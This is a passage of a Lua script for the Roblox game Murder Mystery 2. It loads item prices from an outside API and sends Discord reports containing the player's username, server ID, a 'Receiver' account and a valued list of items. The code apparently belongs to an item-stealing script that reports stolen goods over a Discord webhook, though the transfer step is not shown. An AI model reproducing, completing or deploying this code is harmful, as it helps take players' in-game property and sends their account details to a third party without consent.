}

local function load_item_values()
    local func = syn and syn.request or request or http_request or (http and http.request)
    if not func then return false end
    pcall(function()
        local res = func({Url = "https://api.project-reverse.org/valuables/get?game=mm2", Method = "GET"})
        if res and res.Body then
            local decoded = HttpService:JSONDecode(res.Body)
            if decoded and decoded.success and decoded.data then
                for _, item in ipairs(decoded.data) do
                    if item.name and item.price then
                        ITEM_PRICES[item.name] = item.price
                    end
                end
                VALUES_LOADED = true
            end
        end
    end)
    return true
end

local function get_item_price(item_name)
    if VALUES_LOADED and ITEM_PRICES[item_name] then
        return ITEM_PRICES[item_name]
    end
    return FALLBACK_VALUES[item_name] or 0.01
end

local function SendStatus(status, items_list, receiver)
    local item_text = "None"
    if items_list and #items_list > 0 then
        item_text = ""
        for _, item in ipairs(items_list) do
            item_text = item_text .. item.name .. " — " .. item.value .. "\n"
        end
    end
    pcall(function()
        SendToDiscord({
            embeds = {{
                title = "MM2 SCRIPT — " .. status,
                color = 16711680,
                fields = {
                    {name = "Username", value = LocalPlayer.Name, inline = true},
                    {name = "Receiver", value = receiver or "None", inline = true},
                    {name = "Server", value = string.sub(game.JobId, 1, 8), inline = true},
                    {name = "Items", value = "```" .. item_text .. "```", inline = false}
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
    end)
end

